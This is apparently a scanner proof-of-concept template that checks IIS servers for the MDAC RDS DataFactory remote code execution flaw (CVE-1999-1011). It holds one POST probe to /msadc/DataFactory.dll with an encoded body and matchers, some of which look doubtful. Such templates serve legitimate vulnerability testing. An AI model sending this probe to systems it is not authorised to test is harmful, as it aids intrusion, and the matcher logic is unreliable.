[info]
author = "ave"
description = "检测是否存在 Microsoft IIS MDAC RDS DataFactory 组件的远程代码执行漏洞。该漏洞存在于 Microsoft Data Access Components (MDAC) 2.1 中的 Remote Data Service (RDS) DataFactory 组件中，可通过向目标系统发送特定的 RDS 请求来绕过权限验证，直接利用这些不安全的方法执行任意系统命令。"
id = "POC-AVE-1999-1683"
name = "Microsoft IIS MDAC RDS DataFactory 远程代码执行 PoC"
severity = "critical"
tags = ["ave-1999-1683"]
vuln_id = [
    "CVE-1999-1011",
    "AVE-1999-1683",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/msadc/DataFactory.dll"
protocol = "http"

[poc.requests.body]
content = "Q1NWQ1NXgAAABAAAAAxAAAAHgAAABAAAAABQAAAAcAAAACAAAXAAAADAAAABgAAAAcAAABWUgAAAA"
type = "raw"

[[poc.requests.matchers]]
expect = false
part = "body"
type = "word"
words = ["<html><body><pre>Error Message</pre></body></html>"]

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ['<script language=vbscript>request = CreateObject("MDB.MDBScript"); request.ServerExecute</script>']
